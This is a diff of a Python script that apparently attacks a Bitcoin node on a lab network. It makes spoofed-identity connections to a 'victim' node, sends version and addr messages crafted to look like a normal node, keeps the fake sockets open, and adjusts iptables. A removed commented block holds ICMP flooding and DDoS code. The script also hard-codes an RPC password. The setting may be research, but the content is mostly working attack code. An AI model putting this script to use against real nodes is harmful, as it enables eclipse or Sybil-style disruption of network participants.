@@ -1,156 +1,119 @@
 from _thread import start_new_thread
-import atexit
-#import time
-import os
 from scapy.all import *
-#from impacket import ImpactDecoder, ImpactPacket
+import atexit
+import json
+import os
 
 
 import socket, time, bitcoin
 from bitcoin.messages import msg_version, msg_verack, msg_addr
 from bitcoin.net import CAddress
 
+num_identities = 1
+network_interface = 'enp0s3'
 
 victim_ip = '10.0.2.5'
 victim_port = 8333
 attacker_port = random.randint(1024,65535)
 
-pending_spoof_IPs = []
-successful_spoof_IPs = []
-
-#pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
-
+spoof_IPs = []
+spoof_IP_sockets = []
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
-print(iptables_file_path)
 
 def terminal(cmd):
 	# print('\n> '+cmd)
 	print(os.popen(cmd).read())
 
+def bitcoin(cmd):
+	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
+
 def random_ip():
 	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-def version_pkt(src_ip, dst_ip, port):
-    msg = msg_version()
-    msg.nVersion = 70015 # Most up-to-date as of 3/20/20
-    msg.addrFrom.ip = src_ip
-    msg.addrFrom.port = port
-    msg.addrTo.ip = dst_ip
-    msg.addrTo.port = port
-    return msg
+def version_packet(src_ip, dst_ip, src_port, dst_port):
+	msg = msg_version()
+	msg.nVersion = bitcoin_protocolversion
+	msg.addrFrom.ip = src_ip
+	msg.addrFrom.port = src_port
+	msg.addrTo.ip = dst_ip
+	msg.addrTo.port = dst_port
+	# Default is /python-bitcoinlib:0.11.0/
+	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
+	return msg
 
-def spoof(src_ip, dst_ip):
+# str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
+def addr_packet(str_addrs):
+	msg = msg_addr()
+	addrs = []
+	for i in str_addrs:
+		addr = CAddress()
+		addr.port = 18333
+		addr.nTime = int(time.time())
+		addr.ip = i
+ 
+		addrs.append( addr )
+	msg.addrs = addrs
+	return msg
+
+def initialize_fake_connection(src_ip, dst_ip):
 	src_port = attacker_port
 	dst_port = victim_port
+
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 	
-	#ip = IP(src=src_ip, dst=dst_ip)
-	#SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
+	
+	"""seq = random.randrange(0,2**16)
+	ip = IP(src=src_ip, dst=dst_ip)
+	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
 	#SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
-	#SYNACK=sr1(ip/SYN)
+	SYNACK=sr1(ip/SYN)
 	#send(SYNACK)
 	#time.sleep(1)
 	#print('Sending second packet')
-	#ACK=TCP(sport=src_port, dport=dst_port, flags="S", seq=seq, ack=SYNACK.seq)
-	#ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 2+)
-	#send(ip/ACK)
-	#print('Handshake COMPLETE')
+	ack = SYNACK.seq + 1
+	seq += 1
+	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=seq, ack=ack)
+	send(ip/ACK)
+	print('Handshake COMPLETE')
+
+	PUSH = TCP(sport=src_port, dport=dst_port, flags='PA', seq=11, ack=ack)
+	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
+	"""
 
 	
-	s = socket.socket()#socket.AF_INET, socket.SOCK_STREAM)
-	#s.bind((src_ip, 0))
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) #socket.AF_PACKET, socket.SOCK_RAW) #socket.AF_INET, socket.SOCK_STREAM)
+	#s.bind((src_ip, src_port))
+	#s.listen(1) # Queue up to 1 request
+
 	s.connect((dst_ip, dst_port))
 	# Send version packet
-	s.send(version_pkt(src_ip, dst_ip, dst_port).to_bytes())
+	version = version_packet(src_ip, dst_ip, src_port, dst_port)
+	print(version)
+	s.send(version.to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
-	print(s.recv(1924))
+	print(s.recv(1924)) # Next message received must be <= 1924 bytes
 	# Send verack packet
 	
-	s.send(msg_verack().to_bytes())
+	verack = msg_verack()
+	print(verack)
+	s.send(verack.to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
-	print(s.recv(1024))
+	print(s.recv(1024)) # Next message received must be <= 1024 bytes
+	
 
+	spoof_IPs.append((src_ip, src_port))
+	spoof_IP_sockets.append(s)
 
 	print('\n\n*** ')
 	print('CONNECTION ESTABLISHED')
+	
 	#time.sleep(5)
 	#s.close()
 	#print('CONNECTION CLOSED')
-
-
-	#try:
-	#	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	
-	#packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
-	#	s.connect((dst_ip, dst_port))
-	
-	#send(packet)
-
-	#except Exception as e:
-	#	raise e
-	'''
-	ip = ImpactPacket.IP()
-	ip.set_ip_src(src_ip)
-	ip.set_ip_dst(dst_ip)
-
-	# Create a new ICMP packet
-	icmp = ImpactPacket.ICMP()
-	icmp.set_icmp_type(icmp.ICMP_ECHO)
-
-	#inlude a small payload inside the ICMP packet
-	#and have the ip packet contain the ICMP packet
-	icmp.contains(ImpactPacket.Data("O"*100))
-	ip.contains(icmp)
-	n = 0
-
-	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-
-	#Using ImpactPacket to flood/spoof
-	icmp.set_icmp_id(1)
-	#calculate checksum
-	icmp.set_icmp_cksum(0)
-	icmp.auto_checksum = 0
-	s.sendto(ip.get_packet(), (dst, 8080))
-
-	#Regular socket connection
-	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	ddos.connect((target_ip, port))
-	ddos.send("GET /%s HTTP/1.1\r\n" % message)
-	'''
-
-	#packet.show()
-	return
-
-def initialize_connection(victim_ip):
-	spoof_ip = random_ip()
-	pending_spoof_IPs.append(spoof_ip)
-
-	# Remove all entries
-	#sudo iptables -F
-
-	#terminal(f'iptables -t raw -A PREROUTING -p tcp -d {spoof_ip} -j DROP')
-	#terminal(f'iptables -t raw -A PREROUTING -p tcp --sport {victim_port} -j DROP')
-
-	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -j DROP')
-	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -d {victim_ip} -dport {victim_port} -j DROP')
-	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -d {spoof_ip} -dport {attacker_port} -j DROP')
-	#terminal(f'iptables -A OUTPUT -s {spoof_ip} -d {victim_ip} -p ICMP --icmp-type port-unreachable -j DROP')
-
-	spoof(src_ip = spoof_ip, dst_ip = victim_ip)
-
-def cleanup_iptables():
-	if(os.path.exists(iptables_file_path)):
-		terminal(f'iptables-restore < {iptables_file_path}')
-		os.remove(iptables_file_path)
-		print('Cleaning up IP table')
-
-def backup_iptables():
-	terminal(f'iptables-save > {iptables_file_path}')
-
 
 def packet_received(packet):
 	try:
@@ -180,8 +143,41 @@ def packet_received(packet):
 		pass
 
 
+def initialize_network_info():
+	global bitcoin_subversion, bitcoin_protocolversion
+	bitcoin_subversion = '/Satoshi:0.18.0/'
+	bitcoin_protocolversion = 70015
+	try:
+		network_info = None #json.loads(bitcoin('getnetworkinfo'))
+		if 'subversion' in network_info:
+			bitcoin_subversion = network_info['subversion']
+		if 'protocolversion' in network_info:
+			bitcoin_protocolversion = network_info['protocolversion']
+	except:
+		pass
+
+def backup_iptables():
+	terminal(f'iptables-save > {iptables_file_path}')
+
+def cleanup_iptables():
+	if(os.path.exists(iptables_file_path)):
+		print('Cleaning up iptables...')
+		terminal(f'iptables-restore < {iptables_file_path}')
+		os.remove(iptables_file_path)
+
+# Ran when the script ends
+def on_close():
+	for socket in spoof_IP_sockets:
+		print(f'CLOSING SOCKET {socket}')
+		socket.close()
+	cleanup_iptables()
+	print('Goodbye.')
+
+
 if __name__ == '__main__':
-	atexit.register(cleanup_iptables)
+	initialize_network_info()
+
+	atexit.register(on_close)
 	cleanup_iptables()
 	backup_iptables()
 
@@ -190,7 +186,7 @@ if __name__ == '__main__':
 	#time.sleep(10)
 	try:
 		start_new_thread(sniff, (), {
-			'iface':'enp0s3',
+			'iface':network_interface,
 			'prn':packet_received,
 			'filter':'tcp',
 			'store':1
@@ -198,9 +194,13 @@ if __name__ == '__main__':
 	except:
 		print('Error: unable to start thread')
 
-	for i in range(1, 10 + 1):
-		print(f'\n\nPacket #{i}')
-		initialize_connection(victim_ip = victim_ip)
+	for i in range(1, num_identities + 1):
+		try:
+			initialize_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
+		except ConnectionRefusedError:
+			print('Connection was refused. The victim\'s node must not be running.')
+	print(f'Successful connections: {len(spoof_IPs)}\n')
+
 
 	while 1:
 		time.sleep(1)
